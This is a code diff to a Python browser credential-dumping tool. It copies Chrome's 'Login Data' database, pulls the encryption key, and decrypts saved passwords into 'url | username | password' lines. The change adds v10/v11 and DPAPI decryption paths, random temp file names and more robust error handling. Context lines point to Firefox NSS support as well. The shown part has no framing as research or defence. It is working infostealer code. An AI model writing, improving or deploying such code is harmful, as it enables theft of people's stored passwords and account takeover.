@@ -72,17 +72,6 @@ def setup_nss(profile_path):
         log_error(f"Error setting up NSS: {str(e)}")
         return None
 
-def decrypt_chrome_password(encrypted_value, key):
-    try:
-        iv = encrypted_value[3:15]
-        payload = encrypted_value[15:]
-        cipher = AES.new(key, AES.MODE_GCM, iv)
-        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
-        return decrypted_pass
-    except Exception as e:
-        log_error(f"Error decrypting Chrome password: {str(e)}")
-        return ""
-
 def get_chrome_key(profile_path):
     try:
         local_state_path = os.path.join(os.path.dirname(profile_path), 'Local State')
@@ -95,32 +84,61 @@ def get_chrome_key(profile_path):
         log_error(f"Error getting Chrome master key: {str(e)}")
         return None
 
+def decrypt_chrome_password(encrypted_value, key):
+    try:
+        if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
+            iv = encrypted_value[3:15]
+            payload = encrypted_value[15:]
+            cipher = AES.new(key, AES.MODE_GCM, iv)
+            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
+            return decrypted_pass
+        else:
+            decrypted_pass = CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
+            return decrypted_pass
+    except Exception as e:
+        log_error(f"Error decrypting Chrome password: {str(e)}")
+        return ""
+
 def decrypt_chrome_logins(profile_path):
     results = []
     try:
         login_db = os.path.join(profile_path, 'Login Data')
-        temp_db = os.path.join(tempfile.gettempdir(), 'Login Data')
+        if not os.path.exists(login_db):
+            log_error(f"Login Data file not found at {login_db}")
+            return results
+        
+        temp_db = os.path.join(tempfile.gettempdir(), f"Login_Data_{uuid.uuid4().hex}")
         with open(login_db, 'rb') as src, open(temp_db, 'wb') as dst:
             dst.write(src.read())
         
         key = get_chrome_key(profile_path)
         if not key:
+            log_error("Failed to retrieve Chrome encryption key")
+            os.remove(temp_db)
             return results
         
         conn = sqlite3.connect(temp_db)
+        conn.text_factory = bytes
         cursor = conn.cursor()
         cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
         for row in cursor.fetchall():
             url, username, encrypted_password = row
-            if url and username and encrypted_password:
-                password = decrypt_chrome_password(encrypted_password, key)
-                if password:
-                    results.append(f"{url} | {username} | {password}")
+            try:
+                url = url.decode('utf-8', errors='ignore')
+                username = username.decode('utf-8', errors='ignore') if username else ""
+                if url and username and encrypted_password:
+                    password = decrypt_chrome_password(encrypted_password, key)
+                    if password:
+                        results.append(f"{url} | {username} | {password}")
+            except Exception as e:
+                log_error(f"Error processing login entry: {str(e)}")
         conn.close()
         os.remove(temp_db)
         log_info(f"Extracted Chrome logins from profile {profile_path}: {len(results)}")
     except Exception as e:
         log_error(f"Error decrypting Chrome logins: {str(e)}")
+        if os.path.exists(temp_db):
+            os.remove(temp_db)
     return results
 
 def decrypt_logins(browser, profile_path, nss=None):
